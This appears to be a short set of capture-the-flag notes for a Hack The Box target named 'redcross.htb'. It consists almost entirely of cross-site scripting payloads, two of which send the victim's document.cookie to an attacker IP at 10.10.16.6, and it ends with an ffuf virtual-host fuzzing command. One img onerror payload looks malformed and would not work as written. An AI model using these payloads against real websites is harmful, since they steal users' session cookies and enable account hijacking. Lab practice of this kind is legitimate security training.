<script>alert(1)</script>
<script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>


<img src=x onerror='http://10.10.16.6?c='+document.cookie>
<script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>


ffuf -w /usr/share/seclists -u https://redcross.htb -H "Host: FUZZ.redcross.htb"